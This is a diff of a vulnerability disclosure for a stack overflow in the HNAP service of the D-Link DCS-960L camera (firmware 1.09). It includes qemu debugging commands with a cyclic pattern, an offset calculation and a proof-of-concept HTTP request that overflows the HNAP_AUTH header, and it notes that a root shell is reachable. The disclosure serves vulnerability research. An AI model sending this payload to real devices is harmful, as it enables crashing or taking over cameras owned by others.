@@ -1,4 +1,4 @@
-# DCS-960L 1.09 Stack overflow
+![image](https://github.com/user-attachments/assets/5e236003-0837-4eb2-8a67-5d7383f9b38a)# DCS-960L 1.09 Stack overflow
 
 ## Product Info
 
@@ -11,38 +11,49 @@
 **Firmware**: [D-Link Technical Support (dlinktw.com.tw)](https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L)
 
 
+
 ## Vulnerability introduction
 
-  A stack overflow vulnerability in the SetDCHPolicy function of the HNAP service of D-Link DCS-960L with firmware version 1.09 allows an attacker to execute arbitrary code.
+​    A stack overflow vulnerability exists in the sub_402280 function of the HNAP service of D-Link DCS-960L with firmware version 1.09, allowing an attacker to execute arbitrary code.
+
+![image](https://github.com/user-attachments/assets/cca9fd02-a034-46cb-b540-09f3eda48fcb)
 
 
 
-## Vulnerability analysis
 
+```shell
+qemu-mips-static -g 1337 -E REQUEST_METHOD=POST,SOAP_ACTION=1,CONTENT_LENGTH=404,COOKIE=1,HNAP_AUTH=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaak  -L . ./web/cgi-bin/hnap/hnap_service < info.txt
+```
 
+The return address is retained in 0x407dfd0c
 
-In HNAP's SetDCHPolicy function, by constructing MK, the program does not check the length of the MK field, causing a stack overflow.
+![image](https://github.com/user-attachments/assets/74c72ebb-35d3-4d48-90e7-182da7f1f9aa)
 
-![image](https://github.com/user-attachments/assets/eec2b9b7-309a-4bd8-a8cd-148e3cef7dd5)
+Break at strcpy, dest=0x407df8dc, calculated offset=0x430
 
+![image](https://github.com/user-attachments/assets/3871d299-36be-4b04-9e38-8fb94b4e2f1b)
 
+```shell
+qemu-mips-static -g 1337 -E REQUEST_METHOD=POST,SOAP_ACTION=1,CONTENT_LENGTH=404,COOKIE=1,HNAP_AUTH=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaak  -L . ./web/cgi-bin/hnap/hnap_service < info.txt
+```
+
+![image](https://github.com/user-attachments/assets/308cb5e8-6d3b-4583-9a03-73faa7f89520)
 
 ## POC
 
+```http
+POST /HNAP1/ HTTP/1.1
+Host: 192.168.0.1
+SOAPAction: 1
+HNAP_AUTH: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaak
+Content-Length: 314
+Cookie: aaaaaaaa
 
-
-```xml
-SOAPAction: http://192.168.0.1/HNAP1/Login
-<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
-  <soap:Body>
-    <SetDCHPolicy xmlns="http://192.168.0.1/HNAP1/">
-      <PolicyList>
-        <PolicyInfo>
-          <MK> a * 160000 </MK>
-        </PolicyInfo>
-      </PolicyList>
-    </SetDCHPolicy>
-  </soap:Body>
-</soap:Envelope>
+<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetDCHPolicy xmlns="http://purenetworks.com/HNAP1/"></SetDCHPolicy></soap:Body></soap:Envelope>
 ```
-You can write exp to further obtain the root shell
+
+Further constructing exp can obtain the root shell
+
+
+
+
